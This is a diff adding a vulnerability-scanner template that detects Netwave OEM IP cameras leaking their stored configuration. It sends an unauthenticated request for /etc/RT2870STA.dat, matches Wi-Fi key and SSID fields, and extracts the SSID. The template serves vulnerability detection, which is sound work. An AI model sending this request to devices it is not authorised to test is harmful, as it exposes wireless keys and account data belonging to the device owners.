@@ -1,0 +1,40 @@
+id: netwave-ip-camera-info-disclosure
+
+info:
+  name: Netwave OEM IP Camera - Configuration Disclosure
+  author: kamstrike
+  severity: high
+  description: |
+    Netwave-based OEM cameras serve stored configuration, including wireless pre-shared keys
+    and account data, to unauthenticated requests.
+  remediation: Replace the device or remove it from any routable network.
+  reference:
+    - https://www.exploit-db.com/exploits/40500
+  metadata:
+    verified: true
+    vendor: netwave
+  tags: camera,netwave,exposure,info-leak,kamstrike
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/RT2870STA.dat"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "WPAPSK"
+          - "SSID"
+          - "AuthMode"
+        condition: or
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: ssid
+        part: body
+        group: 1
+        regex:
+          - "SSID\\d*=(\\S+)"
